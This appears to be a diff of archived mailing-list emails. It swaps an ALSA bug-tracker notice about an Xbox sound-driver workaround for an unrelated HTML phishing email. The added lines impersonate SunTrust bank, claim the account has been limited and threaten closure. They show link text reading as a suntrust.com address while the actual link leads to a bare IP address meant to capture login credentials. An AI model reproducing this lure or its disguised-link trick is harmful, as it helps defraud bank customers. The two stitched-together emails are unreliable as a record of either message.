@@ -1,14 +1,19 @@
-From: bugtrack@alsa-project.org
-Subject: [ALSA - driver 0000714]: On newer xboxes, the xbox=1 workaround does not solve the problem.
-Date: Wed, 8 Dec 2004 01:52:36 +0100
-Message-ID: <79c7f2c36d844db28e772cb193e30e0f@bugtrack.alsa-project.org>
+From: Suntrust Online Banking Support <suspended@suntrust.com>
+Subject: Limit of your account 239280990
+Date: Wed, 08 Dec 2004 02:03:22 +0000
+Message-ID: <HFI540J343C5FBH0@suntrust.com>
+References: <9H5J9D85LF7G7HDB@alsa-project.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: 7bit
+Content-Type: text/html; charset=Windows-1251
+Content-Transfer-Encoding: quoted-printable
 Return-path: <alsa-devel-admin@lists.sourceforge.net>
-Received: from bugtrack.alsa-project.org (gate.perex.cz [82.113.61.162])
-	by alsa.alsa-project.org (ALSA's E-mail Delivery System) with ESMTP id 2AFB3380
-	for <alsa-devel@alsa-project.org>; Wed,  8 Dec 2004 01:52:37 +0100 (MET)
+Received: from mail.perex.cz (gate.perex.cz [82.113.61.162])
+	by alsa.alsa-project.org (ALSA's E-mail Delivery System) with ESMTP id EC299328
+	for <alsa-devel@alsa-project.org>; Wed,  8 Dec 2004 02:05:18 +0100 (MET)
+Received: from compuserve.com (adsl-69-105-231-80.dsl.pltn13.pacbell.net [69.105.231.80])
+	by gate.perex.cz (Perex's E-mail Delivery System) with SMTP id 7ECE33D721
+	for <alsa-devel@alsa-project.org>; Wed,  8 Dec 2004 02:05:17 +0100 (MET)
+In-Reply-To: <9H5J9D85LF7G7HDB@alsa-project.org>
 Sender: alsa-devel-admin@lists.sourceforge.net
 Errors-To: alsa-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
@@ -18,62 +23,95 @@ List-Help: <mailto:alsa-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/alsa-devel>,
 	<mailto:alsa-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=alsa-devel>
-To: alsa-devel@alsa-project.org
+To: Alsa <alsa-devel@alsa-project.org>
 List-Id: alsa-devel@alsa-project.org
 
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DWindows=
+-1251">
 
-A NOTE has been added to this issue.
-======================================================================
-<https://bugtrack.alsa-project.org/alsa-bug/view.php?id=714> 
-======================================================================
-Reported By:                davidmpye
-Assigned To:                
-======================================================================
-Project:                    ALSA - driver
-Issue ID:                   714
-Category:                   PCI - intel8x0
-Reproducibility:            always
-Severity:                   major
-Priority:                   normal
-Status:                     new
-Distribution:               Debian
-Kernel Version:             2.4.28
-======================================================================
-Date Submitted:             12-08-2004 01:35 CET
-Last Modified:              12-08-2004 01:52 CET
-======================================================================
-Summary:                    On newer xboxes, the xbox=1 workaround does not
-solve the problem.
-Description: 
-This is a followup to bug 221, and the workaround that was added to ALSA
-1.0.7.
 
-Unfortunately, on newer xboxes, the chip reports less info than before,
-making another change necessary - this change is backwards compatible, and
-doesn't break earlier xboxes, of course. 
+</head>
 
-Please see attached patch.
-======================================================================
+<body bgcolor=3D"#FFFFFF" text=3D"#000000">
 
-----------------------------------------------------------------------
- davidmpye - 12-08-04 01:52 
-----------------------------------------------------------------------
-If the patch requires 'crediting', the original author is Ed Hucek
-(hostmaster@ed-soft.at).
-
-Thanks,
-
-David
-
-Issue History
-Date Modified  Username       Field                    Change              
-======================================================================
-12-08-04 01:35 davidmpye      New Issue                                    
-12-08-04 01:35 davidmpye      Distribution              => Debian          
-12-08-04 01:35 davidmpye      Kernel Version            => 2.4.28          
-12-08-04 01:52 davidmpye      Note Added: 0002772                          
-======================================================================
-
+<table width=3D"940" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+=20
+  <tr>=20
+   <td colspan=3D"2" height=3D"66" valign=3D"top"><img src=3D"http://www.=
+suntrust.com/images/Common/release3/logo_home.gif"=20
+    width=3D"171" height=3D"66"></td>
+    <td width=3D"562"></td>
+    <td width=3D"107"></td>
+  </tr>
+  <tr>=20
+    <td height=3D"9" width=3D"26"></td>
+    <td width=3D"245"></td>
+    <td></td>
+    <td></td>
+  </tr>
+  <tr>=20
+    <td height=3D"176"></td>
+    <td colspan=3D"2" valign=3D"top">=20
+      <p>Dear <b>Valued Customer,</b></p>
+      <p> SunTrust Banks Inc., is committed to maintaining a safe environ=
+ment=20
+        for our customers. To protect the security of your account, SunTr=
+ust Banks=20
+        Inc., employs some of the most advanced security systems in the w=
+orld=20
+        and our anti-fraud teams regularly screen the SunTrust system for=
+ unusual=20
+        activity.</p>
+      <p>We are contacting you to remind you that on Dec. 7, 2004 our Acc=
+ount=20
+        Review Team identified some unusual activity in your account. In =
+accordance=20
+        with SunTrust's User Agreement and to ensure that your account ha=
+s not=20
+        been compromised, access to your account was limited. Your accoun=
+t access=20
+        will remain limited until this issue has been resolved.</p>
+      <p>We encourage you to log in and perform the steps necessary to re=
+store=20
+        your account access as soon as possible. Allowing your account ac=
+cess=20
+        to remain limited for an extended period of time may result in fu=
+rther=20
+        limitations on the use of your account and possible account closu=
+re. Visit to unlock your <a href=3D"http://211.220.194.206/personal/Check=
+ing/OnlineBanking/Internet_Banking/index.php">
+http://www.suntrust.com/personal/Checking/OnlineBanking/Internet_Banking/=
+index.asp</a></p>
+    </td>
+    <td></td>
+  </tr>
+  <tr>=20
+    <td height=3D"26"></td>
+    <td></td>
+    <td></td>
+    <td></td>
+  </tr>
+  <tr>=20
+    <td height=3D"95"></td>
+    <td colspan=3D"2" valign=3D"top"> Thank you for your prompt attention=
+ to this=20
+      matter. Please understand that this is a security measure meant to =
+help=20
+      protect you and your account. We apologize for any inconvenience.=20
+      <p>Sincerely,<br>
+        Suntrust Banks Inc., Account Review Department</p>
+    </td>
+    <td></td>
+  </tr>
+  <tr>=20
+    <td height=3D"18"></td>
+    <td></td>
+    <td></td>
+    <td></td>
+  </tr>
+</table>
+</body>
 
 
 
